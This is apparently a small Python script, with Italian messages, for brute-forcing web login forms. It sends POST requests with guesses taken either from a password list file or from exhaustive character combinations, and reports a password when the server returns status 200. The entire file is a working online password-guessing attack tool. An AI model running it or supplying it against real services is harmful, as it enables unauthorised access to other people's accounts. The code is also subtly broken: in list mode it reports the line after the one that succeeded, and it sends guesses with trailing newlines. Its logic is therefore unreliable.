import sys
import requests


leng = 0
parola = []
parola_parall = []
caratteri = []
nChar = 0
success = False

def generalista(speciali):

    lista = []

    if(speciali==1):
        for i in range (33, 127):
            lista.append(i)
    
    else:
        for i in range (48, 123):
            if(not((i>=58 and i<65) or (i>=91 and i<97))):
                lista.append(i)
    return lista

if len(sys.argv) == 1:
    print("[!] Parametri non inseriti")
    success = True

elif sys.argv[1] == "-h":
    print("[*] <-p> <password list> <url> <method> <nome parametro username> <username da usare> <nome parametro password>")
    print("[*] -p \tspecifichi il file con le password da usare (utilizzabile anche senza specificarla)")
    success = True

elif (sys.argv[1] == "-p"):
    path_list = sys.argv[2]
    url = sys.argv[3]
    method = sys.argv[4].lower()
    data = sys.argv[5:8]

    file = open(path_list, 'r')

    line = file.readline()

    print()

    while line:
   
        myobj = {data[0]:data[1], data[2]: line}
        r = requests.post(url, json = myobj)
        line = file.readline()
        if(r.status_code == 200):
            print("[+] Password:", line)
            success = True
            break

    file.close()

else:
    url = sys.argv[1]
    method = sys.argv[2].lower()
    data = sys.argv[3:6]
    type = int(input("[?] Vuoi usare i caratteri speciali # 1 si| 0 no: "))

    leng = int(input("[?] Lunghezza della password: "))+1

    caratteri = generalista(speciali=type)
    nChar = len(caratteri)
    parola_parall = [0] * leng

    if(method == "post"):
        for i in range(0, leng):
            parola.append(chr(caratteri[0]))


        while not(parola_parall[leng-1] == 1) and not success:
            for k in range(0, nChar):
                parola[0] = chr(caratteri[k])
                parola_parall[0] = k     
                t = "".join(parola[:leng-1])  

                myobj = {data[0]:data[1], data[2]: t}
                r = requests.post(url, json = myobj)
                if(r.status_code==200):
                    print("[+] Password:", t)
                    success = True
                    break

            parola_parall[0] += 1
            for j in range(0, leng-1):
                if(parola_parall[j]==nChar):
                    parola[j] = chr(caratteri[0])
                    parola_parall[j] = 0
                    if((parola_parall[j+1]+1)==nChar):
                        parola_parall[j+1] = parola_parall[j+1]+1
                    else:
                        parola[j+1] = chr(caratteri[parola_parall[j+1]+1])
                        parola_parall[j+1] = parola_parall[j+1]+1
        
if not success:
    print("[-] Password non trovata")
